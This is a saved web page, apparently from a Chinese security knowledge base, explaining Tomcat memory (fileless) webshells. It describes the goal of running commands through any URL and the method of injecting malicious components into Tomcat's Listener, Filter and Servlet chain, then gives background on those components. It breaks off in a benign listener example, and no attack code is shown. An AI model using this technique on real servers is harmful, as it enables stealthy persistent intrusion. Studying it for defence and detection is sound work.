<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-代码审计/Java安全/内存马/Tomcat内存马" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Tomcat内存马 | d4m1ts 知识库</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://blog.gm7.org/docs/代码审计/Java安全/内存马/Tomcat内存马"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Tomcat内存马 | d4m1ts 知识库"><meta data-rh="true" name="description" content="内存马简介"><meta data-rh="true" property="og:description" content="内存马简介"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://blog.gm7.org/docs/代码审计/Java安全/内存马/Tomcat内存马"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/代码审计/Java安全/内存马/Tomcat内存马" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/代码审计/Java安全/内存马/Tomcat内存马" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://0LMFVYF6KV-dsn.algolia.net" crossorigin="anonymous"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="d4m1ts 知识库 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="d4m1ts 知识库 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="d4m1ts 知识库" href="/opensearch.xml">

<link rel="preconnect" href="https://hm.baidu.com">
<script src="https://hm.baidu.com/hm.js?3675030a9721336abea8cd0e46b3f76b" async></script>
<script>window._hmt||(window._hmt=[])</script><link rel="stylesheet" href="/assets/css/styles.74d3050c.css">
<script src="/assets/js/runtime~main.06513570.js" defer="defer"></script>
<script src="/assets/js/main.9542b26a.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate"></b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/intro">知识库</a></div><div class="navbar__items navbar__items--right"><a href="https://markdown.gm7.org/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">在线Markdown</a><a href="https://rshell.gm7.org/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">Reverse Shell Generator</a><a href="https://gtfobins.gm7.org/" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GTFOBins</a><a class="navbar__item navbar__link" href="/friends">友情链接</a><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/渗透测试/">渗透测试</a><button aria-label="展开侧边栏分类 &#x27;渗透测试&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/代码审计/">代码审计</a><button aria-label="折叠侧边栏分类 &#x27;代码审计&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/category/审计基础">Java安全</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/审计基础">审计基础</a><button aria-label="展开侧边栏分类 &#x27;审计基础&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/反序列化链分析">反序列化链分析</a><button aria-label="展开侧边栏分类 &#x27;反序列化链分析&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/应用漏洞分析">应用漏洞分析</a><button aria-label="展开侧边栏分类 &#x27;应用漏洞分析&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/rce回显链">RCE回显链</a><button aria-label="展开侧边栏分类 &#x27;RCE回显链&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/category/内存马">内存马</a><button aria-label="折叠侧边栏分类 &#x27;内存马&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/代码审计/Java安全/内存马/Tomcat内存马">Tomcat内存马</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/内存马/Spring内存马">Spring内存马</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/内存马/Java Agent 内存马">Java Agent 内存马</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/cc">C:C++</a><button aria-label="展开侧边栏分类 &#x27;C:C++&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/codeql">codeql</a><button aria-label="展开侧边栏分类 &#x27;codeql&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/编程开发/GO/GO基础/">编程开发</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/前置基础知识">移动安全</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/应急响应/简介/">应急响应</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/chatgpt">AI</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/暂未分类/自建网盘/h5ai/">暂未分类</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/致谢">致谢</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/更新日志">更新日志</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_z5aJ"><div class="docItemContainer_c0TR"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/代码审计/"><span itemprop="name">代码审计</span></a><meta itemprop="position" content="1"></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Java安全</span><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/category/内存马"><span itemprop="name">内存马</span></a><meta itemprop="position" content="3"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Tomcat内存马</span><meta itemprop="position" content="4"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_bxCs"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Tomcat内存马</h1></header><h2 class="anchor anchorWithStickyNavbar_LWe7" id="内存马简介">内存马简介<a href="#内存马简介" class="hash-link" aria-label="内存马简介的直接链接" title="内存马简介的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="什么是内存马">什么是内存马<a href="#什么是内存马" class="hash-link" aria-label="什么是内存马的直接链接" title="什么是内存马的直接链接">​</a></h3>
<p>随着每年攻防对抗强度的增加，普通的webshell在各大厂商的安全设备下，根本难以存活，想要落地一个实体webshell的难度逐渐增大。逐步完善的过滤机制、前后端分离的趋势，使得传统的webshell生存空间越来越小。于是，随着时代的发展，内存马出现了。</p>
<p><strong>内存马就是一种无需落地文件就能使用的webshell，它将恶意代码写入内存，拦截固定参数来达到webshell的效果。</strong></p>
<p><img decoding="async" loading="lazy" alt="2020101320190720" src="/assets/images/2020101320190720-7dc312a36b74ff88f40e661f1f4f0b9f.jpg" width="1024" height="645" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="如何实现内存马">如何实现内存马<a href="#如何实现内存马" class="hash-link" aria-label="如何实现内存马的直接链接" title="如何实现内存马的直接链接">​</a></h3>
<p>**实现目标：**访问任意url或者指定url，带上命令执行参数，即可让服务器返回命令执行结果</p>
<p>**实现方法：**以java为例，客户端发起的web请求会依次经过<code>Listener</code>--&gt;<code>Filter</code>--&gt;<code>Servlet</code>三个组件，我们只要在这个请求的过程中做手脚，在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode，就可以达到我们的目的。</p>
<p><img decoding="async" loading="lazy" alt="Perbedaan antara Filter dan Pendengar dalam Servlet (Java EE)" src="/assets/images/PAUyk-a9d77a0538cd0137d0a3c1c4e1412ed0.png" width="648" height="543" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="内存马类型">内存马类型<a href="#内存马类型" class="hash-link" aria-label="内存马类型的直接链接" title="内存马类型的直接链接">​</a></h3>
<p>根据注入的方式，大概分类以下两类：</p>
<ul>
<li><code>servlet-api型</code>
<ul>
<li>通过命令执行等方式动态注册一个新的listener、filter或者servlet，从而实现命令执行等功能。特定框架、容器的内存马原理与此类似，如<code>spring</code>的<code>controller</code>内存马，<code>tomcat</code>的<code>valve</code>内存马</li>
</ul>
</li>
<li>字节码增强型<!-- -->
<ul>
<li>通过java的<code>instrumentation</code>动态修改已有代码，进而实现命令执行等功能。</li>
</ul>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="背景知识">背景知识<a href="#背景知识" class="hash-link" aria-label="背景知识的直接链接" title="背景知识的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="java-web三大件">Java web三大件<a href="#java-web三大件" class="hash-link" aria-label="Java web三大件的直接链接" title="Java web三大件的直接链接">​</a></h3>
<p>详情的可以自己去研究，搜索关键词<code>maven tomcat servlet 开发</code>，这里大概描述一下</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="servlet">Servlet<a href="#servlet" class="hash-link" aria-label="Servlet的直接链接" title="Servlet的直接链接">​</a></h4>
<p>Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。</p>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="请求的处理过程">请求的处理过程<a href="#请求的处理过程" class="hash-link" aria-label="请求的处理过程的直接链接" title="请求的处理过程的直接链接">​</a></h5>
<p><img decoding="async" loading="lazy" alt="浏览器访问Servlet过程" src="/assets/images/5-1Z610154349322-6cbd2a785b763dde46fcf89fec6d8e17.png" width="720" height="337" class="img_ev3q"></p>
<ol>
<li>
<p>浏览器向 Web 服务器发送了一个 HTTP 请求，Servlet容器根据收到的请求，会先创建一个 <code>HttpServletRequest</code> 和 <code>HttpServletResponse</code> 对象</p>
</li>
<li>
<p>调用相应的 Servlet 程序，在 Servlet 程序运行时，它首先会从 <code>HttpServletRequest</code> 对象中读取数据信息，然后通过 <code>service()</code> 方法处理请求消息</p>
</li>
<li>
<p><code>service()</code>方法根据请求类型，分别调用<code>doGet</code>或者<code>doPost</code>方法，其中<code>doXXX</code>方法是我们自己写的逻辑Controller</p>
</li>
<li>
<p>将处理后的响应数据写入到 <code>HttpServletResponse</code> 对象中。</p>
</li>
<li>
<p>Web 服务器会从 <code>HttpServletResponse</code> 对象中读取到响应数据，并发送给浏览器</p>
</li>
<li>
<p>容器关闭时候，会调用<code>destory</code>方法</p>
</li>
</ol>
<blockquote>
<p>需要注意的是，在Web服务器运行阶段，每个Servlet都只会创建一个实例对象，针对每次HTTP请求，Web服务器都会调用所请求Servlet实例的 <code>service（HttpServletRequest request，HttpServletResponse response）</code>方法，并重新创建一个 request 对象和一个 response 对象。</p>
</blockquote>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="servlet生命周期">servlet生命周期<a href="#servlet生命周期" class="hash-link" aria-label="servlet生命周期的直接链接" title="servlet生命周期的直接链接">​</a></h5>
<p><img decoding="async" loading="lazy" alt="Servlet生命周期" src="/assets/images/4ab583a4bffc5bf7da6184300b4ad399bdc-6af734a57113c2d2dfbf8857d20d8bf4.jpg" width="1065" height="599" class="img_ev3q"></p>
<ol>
<li>服务器启动时(web.xml中配置<code>load-on-startup=1</code>，默认为0)或者第一次请求该servlet时，就会初始化一个Servlet对象，也就是会执行初始化方法<code>init(ServletConfig conf)</code>。</li>
<li>servlet对象去处理所有客户端请求，在<code>service(ServletRequest req，ServletResponse res)</code>方法中执行</li>
<li>服务器关闭时，销毁这个servlet对象，执行<code>destroy()</code>方法。</li>
<li>由JVM进行垃圾回收。</li>
</ol>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="代码示例">代码示例<a href="#代码示例" class="hash-link" aria-label="代码示例的直接链接" title="代码示例的直接链接">​</a></h5>
<p><img decoding="async" loading="lazy" alt="image-20211123101401780" src="/assets/images/image-20211123101401780-4f18566b701898d5552fe41c85e2657f.png" width="2132" height="1016" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="image-20211123101431152" src="/assets/images/image-20211123101431152-5883778432c77c5faeefa0f77e999267.png" width="952" height="232" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="filter">Filter<a href="#filter" class="hash-link" aria-label="Filter的直接链接" title="Filter的直接链接">​</a></h4>
<p>filter也称之为过滤器，是对Servlet技术的一个强补充，其主要功能是在<code>HttpServletRequest</code>到达 <code>Servlet</code> 之前，拦截客户的<code>HttpServletRequest</code> ，根据需要检查<code>HttpServletRequest</code>，也可以修改<code>HttpServletRequest</code> 头和数据；在<code>HttpServletResponse</code>到达客户端之前，拦截<code>HttpServletResponse</code> ，根据需要检查<code>HttpServletResponse</code>，也可以修改<code>HttpServletResponse</code>头和数据。</p>
<blockquote>
<p>简单来说就是在Servlet处理请求前和Servlet响应请求后实现一些特殊的功能</p>
</blockquote>
<p><img decoding="async" loading="lazy" alt="image-20211123101042171" src="/assets/images/image-20211123101042171-147f51cd15318be4760771a2f1313f1b.png" width="1482" height="738" class="img_ev3q"></p>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="基本工作原理">基本工作原理<a href="#基本工作原理" class="hash-link" aria-label="基本工作原理的直接链接" title="基本工作原理的直接链接">​</a></h5>
<p>1、Filter 程序是一个实现了特殊接口的 Java 类，与 Servlet 类似，也是由 Servlet 容器进行调用和执行的。</p>
<p>2、当在 <code>web.xml</code> 注册了一个 Filter 来对某个 Servlet 程序进行拦截处理时，它可以决定是否将请求继续传递给 Servlet 程序，以及对请求和响应消息是否进行修改。</p>
<p>3、当 Servlet 容器开始调用某个 Servlet 程序时，如果发现已经注册了一个 Filter 程序来对该 Servlet 进行拦截，那么容器不再直接调用 Servlet 的 service 方法，而是调用 Filter 的 doFilter 方法，再由 doFilter 方法决定是否去激活 service 方法。</p>
<p>4、但在 <code>Filter.doFilter</code> 方法中不能直接调用 Servlet 的 service 方法，而是调用 <code>FilterChain.doFilter</code> 方法来激活目标 Servlet 的 service 方法，FilterChain 对象时通过 <code>Filter.doFilter</code> 方法的参数传递进来的。</p>
<p>5、只要在 <code>Filter.doFilter</code> 方法中调用 <code>FilterChain.doFilter</code> 方法的语句前后增加某些程序代码，这样就可以在 Servlet 进行响应前后实现某些特殊功能。</p>
<p>6、如果在 <code>Filter.doFilter</code> 方法中没有调用 <code>FilterChain.doFilter</code> 方法，则目标 Servlet 的 service 方法不会被执行，这样通过 Filter 就可以阻止某些非法的访问请求。</p>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="filter的生命周期">filter的生命周期<a href="#filter的生命周期" class="hash-link" aria-label="filter的生命周期的直接链接" title="filter的生命周期的直接链接">​</a></h5>
<ol>
<li>当服务器启动，就会创建Filter对象（随着Tomcat的启动而创建），并调用<code>init()</code>方法，只调用一次</li>
<li>当访问资源时，路径与filter拦截路径匹配，会执行Filter中的<code>doFilter</code>方法，这个方法是真正拦截操作的方法。</li>
<li>当服务器关闭时，会调用Filter中的<code>destroy</code>方法来进行销毁操作。</li>
</ol>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="filter链">filter链<a href="#filter链" class="hash-link" aria-label="filter链的直接链接" title="filter链的直接链接">​</a></h5>
<p>当多个filter同时存在的时候，组成了filter链。</p>
<p>web服务器根据Filter在web.xml文件中的注册顺序，决定先调用哪个Filter。当第一个Filter的doFilter方法被调用时，web服务器会创建一个代表Filter链的<code>FilterChain</code>对象传递给该方法，通过判断<code>FilterChain</code>中是否还有filter决定后面是否还调用filter。</p>
<p><img decoding="async" loading="lazy" alt="java web filter链" src="/assets/images/c79d5ffdb5f4477e2c8489b0d8e0c6ff-6cb59a5010201b98e3428f4ee7a8c855.png" width="786" height="291" class="img_ev3q"></p>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="代码示例-1">代码示例<a href="#代码示例-1" class="hash-link" aria-label="代码示例的直接链接" title="代码示例的直接链接">​</a></h5>
<p><img decoding="async" loading="lazy" alt="image-20211123102549485" src="/assets/images/image-20211123102549485-bce482d18f7a8fad60a6294648ccbe3e.png" width="2192" height="1062" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="image-20211123102558677" src="/assets/images/image-20211123102558677-4631bfb7b4de0328c1ed010df4899288.png" width="994" height="180" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="listener">Listener<a href="#listener" class="hash-link" aria-label="Listener的直接链接" title="Listener的直接链接">​</a></h4>
<p>程序开发中，经常需要对某些事件进行监听，比如监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。</p>
<p>事件：用户的一个操作，如点击按钮</p>
<p>事件源：产生事件的对象。</p>
<p>监听器：负责监听发生在事件源上的事件。</p>
<p>注册监听：将事件，事件源，监听器绑定在一起。当事件源上发生某个事件后，执行监听器代码。</p>
<h5 class="anchor anchorWithStickyNavbar_LWe7" id="代码示例-2">代码示例<a href="#代码示例-2" class="hash-link" aria-label="代码示例的直接链接" title="代码示例的直接链接">​</a></h5>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">import javax.servlet.ServletContextEvent;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.servlet.ServletContextListener;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.servlet.annotation.WebListener;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.servlet.http.HttpSessionAttributeListener;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.servlet.http.HttpSessionEvent;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.servlet.http.HttpSessionListener;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.servlet.http.HttpSessionBindingEvent;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@WebListener()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class HelloListener implements ServletContextListener,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        HttpSessionListener, HttpSessionAttributeListener {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    // Public constructor is required by servlet spec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public HelloListener() {</span><br></span><span class="token-line" 